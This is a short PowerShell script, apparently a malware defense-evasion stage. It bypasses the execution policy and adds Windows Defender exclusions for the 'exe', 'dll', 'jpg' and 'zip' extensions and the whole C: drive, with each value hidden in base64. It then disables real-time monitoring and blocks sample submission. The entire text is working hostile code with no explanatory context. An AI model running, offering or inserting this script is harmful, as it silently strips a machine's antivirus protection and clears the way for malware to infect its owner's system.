Set-ExecutionPolicy Bypass –Force
Add-MpPreference -ExclusionExtension $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGUA')))
Add-MpPreference -ExclusionExtension $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABsAGwA')))
Add-MpPreference -ExclusionExtension $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('agBwAGcA')))
Add-MpPreference -ExclusionExtension $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('egBpAHAA')))
Add-MpPreference -ExclusionPath $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwA')))
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -SubmitSamplesConsent NeverSend